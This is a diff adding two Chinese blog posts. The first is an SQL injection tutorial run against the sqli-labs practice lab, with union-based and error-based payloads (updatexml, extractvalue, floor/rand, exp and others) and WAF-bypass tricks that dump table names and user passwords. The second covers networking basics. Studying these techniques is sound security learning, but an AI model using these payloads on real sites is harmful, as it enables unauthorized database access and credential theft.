@@ -76,6 +76,675 @@
     
     
     
+    <article id="post-MYSQL-SQL-BYPASS" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/04/22/MYSQL-SQL-BYPASS/"
+    >MYSQL_SQL_BYPASS</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/04/22/MYSQL-SQL-BYPASS/" class="article-date">
+  <time datetime="2020-04-22T14:26:06.000Z" itemprop="datePublished">2020-04-22</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <p>知其然，更要知其所以然！ </p>
+<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h2><p>是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息，让我们从爆破表名到了可以直接查询</p>
+<p>我们经常用到的几个表</p>
+<ol>
+<li><strong>SCHEMATA表</strong> ： 提供了当前mysql实例中所有数据库的信息。</li>
+<li><strong>TABLES 表 ：</strong> 提供了关于数据库中的表的信息。</li>
+<li><strong>COLUMNS 表 ：</strong>提供了表中的列信息</li>
+</ol>
+<p>SCHEMATA: </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | test               | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>TABLES:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">&#x2F;&#x2F;注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<p>COLUMNS：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; and table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<p>user 表保存的用户密码 和host等等信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; select user,password from user;</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| user | password                                  |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a><strong>符号</strong></h2><h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a><strong>注释符号</strong></h3><p>MySQL中拥有多种注释符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">&#x2F;**&#x2F;  &#x2F;*&#x2F;**&#x2F;这样是等效于&#x2F;**&#x2F;</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">&#96;</span><br><span class="line">&#x2F;*!*&#x2F; 内列注释为什么放在这里呢，因为它也可以当作一个空格 &#x2F;*!&#x2F;*!*&#x2F;是等效于&#x2F;*!*&#x2F;的</span><br></pre></td></tr></table></figure>
+
+<h3 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a><strong>操作符与逻辑操作符</strong></h3><p>排列在同一行的操作符具有相同的优先级</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">:&#x3D;</span><br><span class="line"></span><br><span class="line">||, OR, XOR</span><br><span class="line"></span><br><span class="line">&amp;&amp;, AND</span><br><span class="line"></span><br><span class="line">NOT</span><br><span class="line"></span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line"></span><br><span class="line">&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN</span><br><span class="line"></span><br><span class="line">|</span><br><span class="line"></span><br><span class="line">&amp;</span><br><span class="line"></span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line"></span><br><span class="line">-, +</span><br><span class="line"></span><br><span class="line">*, &#x2F;, DIV, %, MOD</span><br><span class="line"></span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line"></span><br><span class="line">!</span><br><span class="line"></span><br><span class="line">BINARY, COLLATE</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入产生的原因"><a href="#注入产生的原因" class="headerlink" title="注入产生的原因"></a><strong>注入产生的原因</strong></h2><ol>
+<li><strong>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</strong></li>
+<li><strong>过滤不严格。</strong></li>
+<li><strong>数据库配置不当。</strong></li>
+<li><strong>转义不当。</strong></li>
+</ol>
+<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的fuzz上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入， 但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>
+<ol>
+<li>当网站为成熟的cms框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</li>
+<li>判断为自己开发的系统，目标不是很重要可以尝试使用AWVS 等工具。</li>
+<li>信息收集的重要性，可能它的源码就在GitHub上，或者一个备份文件。</li>
+</ol>
+<hr>
+<h2 id="数据库信息收集"><a href="#数据库信息收集" class="headerlink" title="数据库信息收集"></a><strong>数据库信息收集</strong></h2><p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到 <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p>
+<p><code>/*!*/</code> 意为在xxx版本之上执行 我的版本是5.6所以可以执行</p>
+<p>路径的话一般用<code>@@datadir</code>就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p>
+<p><code>system_user()</code> //系统用户名 <code>user()</code> // 用户名 <code>current_user()</code> //当前用户名 <code>session_user()</code> //链接数据库的用户名</p>
+<p>读取host与user</p>
+<p><strong>通过以上信息还能大概判断下是不是站库分离之类的</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select version(),@@version,user();</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| id                | username          | password       |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">| 1                 | admin             | admin          |</span><br><span class="line">| 10.3.20-MariaDB-1 | 10.3.20-MariaDB-1 | root@localhost |</span><br><span class="line">+-------------------+-------------------+----------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin where id&#x3D;1 union select 1,host,user from mysql.user;</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">| id   | username  | password |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    1 | localhost | root     |</span><br><span class="line">+------+-----------+----------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a><strong>注入实战</strong></h2><h3 id="Sqli-Less-1"><a href="#Sqli-Less-1" class="headerlink" title="Sqli/Less-1"></a><strong>Sqli/Less-1</strong></h3><p>简单检测下，是字符型注入，推测语句为  <strong>select x,x from xxx where x=’id’ limit 0,1</strong></p>
+<p>同时#被过滤，但 –+ 可以</p>
+<p>order by 猜测 列数  —-爆出为3列</p>
+<p>limit 2，1 表示 从第3条开始取，取1条，即3</p>
+<p>limit 3，4 表示从第4条开始取，取4条，即4-7</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-2' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
+
+<p>可以爆出所有表–emails,referers,uagents,users</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-2&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +</span><br></pre></td></tr></table></figure>
+
+<p>可以爆出user表下的所有列—id,username,password</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-2&#39; union select 1,group_concat(id,username,password),3 from users -- +</span><br></pre></td></tr></table></figure>
+
+<p>爆字段—</p>
+<p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity</p>
+<p>总结：group_concat()可以聚合起来，查看更方便</p>
+<p>如果 group_concat()被过滤，可以用它的替代函数——</p>
+<p>当我们使用 <code>information_schema.schemata</code> 时被拦截了,我们可以这样绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#96;information_schema&#96;.&#96;schemata &#96;  </span><br><span class="line">information_schema&#x2F;**&#x2F;.schemata</span><br><span class="line">information_schema&#x2F;*!*&#x2F;.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>
+
+<p>users表被拦截，可以用以下方法绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security.users 数据库名 加表名</span><br><span class="line">security.&#96;users&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a><strong>1.floor()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and(select 1 from </span><br><span class="line"> (</span><br><span class="line">     select </span><br><span class="line">     count(*),</span><br><span class="line">     concat(user(),floor(rand(0)*2))  x </span><br><span class="line">     from </span><br><span class="line">     information_schema.tables </span><br><span class="line">     group by </span><br><span class="line">     x)a);</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;root@localhost1&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>
+
+<p>Q1.floor()函数是什么？</p>
+<p>A1.floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整，只保留整数部分。</p>
+<p>Q2.rand(0)是什么意思？</p>
+<p>A2.rand()函数可以用来生成0或1，但是rand(0)和rand()还是有本质区别的，rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数成成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成</p>
+<p>这也是我们采用rand(0)进行报错注入的原因，rand(0)是稳定的，这样每次注入都会报错，而rand()则需要碰运气了</p>
+<p>Q3.为什么会出现报错？</p>
+<p>A3.我们看一下报错的内容：Duplicate entry ‘root@localhost1’ for key ‘group_key’</p>
+<p>意思是说group_key条目重复。我们使用group by进行分组查询的时候，数据库会生成一张虚拟表</p>
+<p>在这张虚拟表中，group  by后面的字段作为主键，所以这张表中主键是name，这样我们就基本弄清报错的原因了，其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，</p>
+<p>第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；</p>
+<p>第二次是假设group  by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
+<h3 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a><strong>2.extractvalue()</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from admin  where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost~&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">3.updatexml()</span><br><span class="line">select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+
+<p>每个一个报错语句都有它的原理 比如 <code>exp()</code> 报错的原理 ,手册说到exp是一个数学函数 取e的x次方，当我们输入的值大于709就会报错 然后~取反它的值总会大于709所以报错。</p>
+<p>简单的用报错语句来注入一下把这里我就利用函数 <code>updatexml()</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: 是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure>
+
+<p>其中关键点就是<code>XPath_string</code> 这块了 因为我们传入的的不是<code>XPath_string</code></p>
+<p>为什么要使用<code>concat</code> 这个函数呢，因为它是个连接函数你不用的话<code>(updatexml(1,(select user()),1))</code> 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到<code>concat</code>用特殊字符给他连接起来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">爆库：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name&#x3D;0x7573657273 limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">爆数据：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +</span><br></pre></td></tr></table></figure>
+
+<p>在报错里面直接使用 MySQL最基本的查表就可以了,你也可以把concat放在外面 </p>
+<p><code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>
+<p>自己灵活多变，这里我值得注意的是它加了连接字符md5只能爆出31位,你可以用分割函数分割出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">substr(string string,num start,num length);</span><br><span class="line"></span><br><span class="line">string为字符串</span><br><span class="line"></span><br><span class="line">start为起始位置</span><br><span class="line"></span><br><span class="line">length为长度</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+    <footer class="article-footer">
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="post-计网基础" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/"
+    >计网基础</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/" class="article-date">
+  <time datetime="2020-04-17T12:24:27.000Z" itemprop="datePublished">2020-04-17</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a><strong>基本概念</strong></h2><p><strong>osi七层模型：</strong></p>
+<p><strong>(物理层-数据链路层)-网络层-运输层-(会话层-表示层-应用层)</strong></p>
+<p>只要遵循 OSI 标准，一个系统就可以和位于世界上任何地方的、也遵循这同一标准的其他任何系统进行通信。</p>
+<p>但是OSI在市场化方面是失败的—过于复杂等因素</p>
+<p><strong>TCP/IP 获得了最广泛的应用–四层体系结构</strong></p>
+<p><strong>网络接口层–网际层IP-运输层（TCP-UDP)–应用层</strong></p>
+<p>还有折中的五层体系结构： <strong>物理层–数据链路层–网络层–运输层–应用层</strong></p>
+<p><strong>计算机网络性能指标：</strong></p>
+<p>带宽：单位时间内网络中的某信道所能通过的“最高数据率”，单位是bit/s  —-上限</p>
+<p>吞吐量：单位时间内通过某个网络（或信道、接口）的<strong>实际的数据量</strong>                                                                                                                                                                                             </p>
+<hr>
+<p><strong>实体：</strong>表示任何可发送或接收信息 的硬件或软件进程</p>
+<p>同一系统相邻两层的实体进行交互的地方，称为 <strong>服务访问点 SAP (Service Access Point)</strong></p>
+<p><strong>PDU（protocol data unit）</strong>每一层使用自己层的协议和别的系统对应层相互通信，交换的信息叫做<strong>协议数据单</strong></p>
+<p><strong>• 上三层：message 消息</strong> </p>
+<p><strong>• 传输层：segment 数据段</strong></p>
+<p><strong>• 网络层：packet 包</strong></p>
+<p><strong>• 链路层：frame 帧</strong></p>
+<p><strong>• 物理层：bit     比特流</strong></p>
+<p>互联网组成 按工作方式划分为以下的两部分： </p>
+<p><strong>(1)边缘部分</strong> 所有连接在互联网上的主机用户直接使用，进行通信和资源共享</p>
+<p><strong>(2)核心部分</strong> 大量网络和连接网络的设备组成为边缘部分提供连通交换</p>
+<p>互联网的边缘部分–两种通信方式 </p>
+<p><strong>• 客户–服务器方式</strong>（<strong>C/S 方式）</strong> 即Client/Server方式 </p>
+<p><strong>• 对等方式（P2P 方式）</strong> 即 Peer-to-Peer方式</p>
+<hr>
+<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a><strong>网络层</strong></h2><h3 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><strong>网际协议IP</strong></h3><p>与 IP 协议配套使用的还有三个协议： </p>
+<p><strong>– 地址解析协议 ARP (Address Resolution Protocol)</strong> </p>
+<p><strong>– 网际控制报文协议 ICMP (Internet Control Message Protocol)</strong> </p>
+<p><strong>– 网际组管理协议 IGMP (Internet Group Management Protocol)</strong></p>
+<p><strong>IP 地址 ::= { &lt;网络号&gt;, &lt;主机号&gt;}</strong> </p>
+<p><strong>网络号net-id</strong>，它标志主机（或路由器）所连接到的网络</p>
+<p><strong>主机号host-id</strong>，它标志该主机 （或路由器）</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>网络数目</th>
+<th>第一个可用的网络号</th>
+<th>最后一个课用的网络号</th>
+<th>最大的主机数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A类</td>
+<td>126 (2^7-1)</td>
+<td>1</td>
+<td>126</td>
+<td>1600万</td>
+</tr>
+<tr>
+<td>B类</td>
+<td>16383  (2^14-1)</td>
+<td>128.1</td>
+<td>191.255</td>
+<td>65534</td>
+</tr>
+<tr>
+<td>C类</td>
+<td>2^21 -1</td>
+<td>192.0.1</td>
+<td>223.255.255</td>
+<td>254</td>
+</tr>
+</tbody></table>
+<p> <strong>特殊的IP地址</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这三个网段是私有地址，可以用于自己组网使用，这些地址主要用于企业内部网络中</span></span><br><span class="line"><span class="comment">#而使用这三个网段的计算机要上网必须要通过地址翻译（NAT），将私有地址翻译成公用合法的IP地址</span></span><br><span class="line"><span class="number">10</span>.*.*.*    <span class="number">172.16</span>.*.*    <span class="number">172.31</span>.*.*   <span class="number">192.168</span>.*.*  </span><br><span class="line"></span><br><span class="line"><span class="comment">#如果你的主机使用了DHCP功能自动获得一个ip地址，那么当你的DHCP服务器发生故障或响应时间太长而超出系统规定的一个时间，windows系统会为你分配这样一个地址</span></span><br><span class="line"><span class="number">169.254</span>.*.*</span><br><span class="line"></span><br><span class="line"><span class="comment">#限制广播地址。对本机来说，这个地址指本网段内(同一广播域)的所有主机。如果翻译成人类的语言，应该是这样：“这个房间里的所有人都注意了！”这个地址不能被路由器转发。</span></span><br><span class="line"><span class="number">255.255</span>.<span class="number">255.255</span></span><br></pre></td></tr></table></figure>
+
+<p>在同一个局域网上的主机或路由器 他们IP地址的网络号必须是一样</p>
+<p>路由器总是具有<strong>两个或两个以上的IP地址</strong>。 路由器的每一个接口都有一个不同网络号的IP地址</p>
+<hr>
+<h3 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><strong>地址解析协议 ARP</strong></h3><p>数据链路层的帧 必须使用硬件地址</p>
+<p>每一个主机都有一个 ARP 高速缓存(ARP cache) </p>
+<p>– 映射表–存放局域网上的各主机、路由器的 IP 地址和 硬件地址 </p>
+<p>– 减少网络上的通信量 </p>
+<p>• 主机 A 向本网的主机 B 发送 IP 数据报 </p>
+<p>根据IP地址查找 ARP 高速缓存 </p>
+<p>– 如有，将硬件地址写入 MAC 帧</p>
+<p>– 如没有，ARP请求广播，如下图</p>
+<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/1.png" style="zoom:80%;">
+
+<p>• ARP 是解决<strong>同一个局域网上</strong>的主机或路由器 的 IP 地址和硬件地址的映射问题</p>
+<p> • 如果所要找的主机和源主机不在同一个局域网上，那么网关来了</p>
+<p> <strong>• 网关-</strong>-网络层以上使用的中间设备，很少用 </p>
+<p>​          –路由器的旧称</p>
+<p><strong>• 使用 ARP 的四种典型情况</strong></p>
+<p> • 发送方是主机，要把IP数据报发送到本网络上的另一个主 机。这时用 ARP 找到目的主机的硬件地址。 </p>
+<p>• 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到网关硬件地址。剩下的工作由 网关来完成。 </p>
+<p>• 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。</p>
+<p>• 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上另一个路由器的硬 件地址。剩下的工作由这个路由器来完成</p>
+<hr>
